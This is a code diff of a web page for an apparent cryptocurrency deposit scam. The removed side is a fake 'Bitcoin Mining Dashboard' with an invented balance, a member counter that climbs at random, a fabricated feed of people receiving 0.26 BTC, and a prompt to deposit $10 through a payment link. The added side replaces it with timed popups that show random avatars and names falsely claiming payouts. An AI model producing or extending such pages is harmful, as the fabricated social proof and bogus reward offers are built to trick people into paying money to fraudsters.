@@ -121,126 +121,51 @@
       color: #fff;
       cursor: pointer;
     }
-
-    body.sidebar-hidden #main {
-      width: 100vw;
-    }
-    body.sidebar-shown #main {
-      width: calc(100vw - 200px);
+    .popup img {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      margin-bottom: 10px;
     }
   </style>
 </head>
-<body class="sidebar-hidden">
-
-  <!-- Sidebar -->
-  <div id="sidebar" class="hidden">
-    <button onclick="goHome()">🏠 Home</button>
-    <button onclick="showDepositPopup(); hideSidebar()">💰 Deposit Now</button>
+<body>
+  <!-- Existing HTML above -->
+  <div class="overlay" id="joinPopupOverlay"></div>
+  <div class="popup" id="joinPopup">
+    <span class="close-btn" onclick="hideJoinPopup()">×</span>
+    <img id="popupImage" src="" alt="User">
+    <div id="popupMessage"></div>
+    <button onclick="hideJoinPopup()">OK</button>
   </div>
-
-  <!-- Main Dashboard -->
-  <div id="main">
-    <button class="toggle-btn" id="toggleSidebar">☰</button>
-    <header>Bitcoin Mining Dashboard</header>
-
-    <div class="stat-box">
-      <h3>Your Balance</h3>
-      <div style="font-size: 24px; margin-top: 5px;">$0.26</div>
-      <button onclick="showClaimForm()">Claim Now</button>
-    </div>
-
-    <div class="stat-box">
-      <h3>Total Members</h3>
-      <div id="member-count">4,567,232</div>
-    </div>
-
-    <div class="live-activity">
-      <h3 style="color: #f2a900; margin-bottom: 10px;">Live Activity</h3>
-      <div id="activity-feed"></div>
-    </div>
-  </div>
-
-  <!-- Deposit Popup -->
-  <div class="overlay" id="depositOverlay" onclick="hideDepositPopup()"></div>
-  <div class="popup" id="depositPopup">
-    <span class="close-btn" onclick="hideDepositPopup()">×</span>
-    <div style="font-size: 20px; margin-bottom: 10px;">🎉</div>
-    <div>🎁 Deposit $10 and get up to 0.26 BTC FREE!</div>
-    <button onclick="window.location.href='https://paystack.com/pay/example'">Deposit Now</button>
-  </div>
-
-  <!-- Claim Popup -->
-  <div class="overlay" id="claimOverlay" onclick="hideClaimForm()"></div>
-  <div class="popup" id="claimPopup">
-    <span class="close-btn" onclick="hideClaimForm()">×</span>
-    <h3>Select Payment Method</h3>
-    <select style="width: 100%; padding: 8px; margin: 10px 0;">
-      <option>Credit Card</option>
-      <option>PayPal</option>
-      <option>PalmPay</option>
-      <option>CashApp</option>
-    </select>
-    <button onclick="window.location.href='https://paystack.com/pay/example'">Continue</button>
-  </div>
-
+  <audio id="notifySound" src="https://actions.google.com/sounds/v1/cartoon/clang_and_wobble.ogg"></audio>
   <script>
-    const toggleBtn = document.getElementById("toggleSidebar");
-    const sidebar = document.getElementById("sidebar");
-
-    toggleBtn.onclick = () => {
-      sidebar.classList.remove("hidden");
-      document.body.classList.remove("sidebar-hidden");
-      document.body.classList.add("sidebar-shown");
-    };
-
-    function hideSidebar() {
-      sidebar.classList.add("hidden");
-      document.body.classList.add("sidebar-hidden");
-      document.body.classList.remove("sidebar-shown");
-    }
-
-    function goHome() {
-      alert("Redirecting to Home (Fake)");
-      hideSidebar();
-    }
-
-    function showDepositPopup() {
-      document.getElementById("depositOverlay").style.display = "block";
-      document.getElementById("depositPopup").style.display = "block";
-    }
-
-    function hideDepositPopup() {
-      document.getElementById("depositOverlay").style.display = "none";
-      document.getElementById("depositPopup").style.display = "none";
-    }
-
-    function showClaimForm() {
-      document.getElementById("claimOverlay").style.display = "block";
-      document.getElementById("claimPopup").style.display = "block";
-    }
-
-    function hideClaimForm() {
-      document.getElementById("claimOverlay").style.display = "none";
-      document.getElementById("claimPopup").style.display = "none";
-    }
-
-    let count = 4567232;
-    setInterval(() => {
-      count += Math.floor(Math.random() * 3);
-      document.getElementById("member-count").textContent = count.toLocaleString();
-    }, 5000);
-
-    const names = ["Angela R.", "Carlos L.", "James K.", "Fatima S.", "Wei C."];
-    const feed = document.getElementById("activity-feed");
-    function addActivity() {
+    const countries = ["USA", "Ghana", "UK", "Germany", "India", "Brazil", "Canada"];
+    const names = ["Alice", "Michael", "Fatima", "Yuri", "Kojo", "Isabelle"];
+    const images = [
+      "https://i.pravatar.cc/150?img=1",
+      "https://i.pravatar.cc/150?img=2",
+      "https://i.pravatar.cc/150?img=3",
+      "https://i.pravatar.cc/150?img=4",
+      "https://i.pravatar.cc/150?img=5",
+      "https://i.pravatar.cc/150?img=6"
+    ];
+    const notifySound = document.getElementById("notifySound");
+    function showJoinPopup() {
       const name = names[Math.floor(Math.random() * names.length)];
-      const type = Math.random() < 0.5 ? "withdrew" : "deposited $10 and received";
-      const entry = document.createElement("div");
-      entry.style.padding = "5px 0";
-      entry.textContent = `${name} ${type} 0.26 BTC`;
-      feed.insertBefore(entry, feed.firstChild);
+      const country = countries[Math.floor(Math.random() * countries.length)];
+      const image = images[Math.floor(Math.random() * images.length)];
+      document.getElementById("popupImage").src = image;
+      document.getElementById("popupMessage").innerHTML = `🎉 ${name} from ${country} just claimed 0.26 BTC!`;
+      document.getElementById("joinPopupOverlay").style.display = "block";
+      document.getElementById("joinPopup").style.display = "block";
+      notifySound.play();
     }
-    setInterval(addActivity, 4000);
+    function hideJoinPopup() {
+      document.getElementById("joinPopupOverlay").style.display = "none";
+      document.getElementById("joinPopup").style.display = "none";
+    }
+    setInterval(showJoinPopup, 30000);
   </script>
 </body>
 </html>
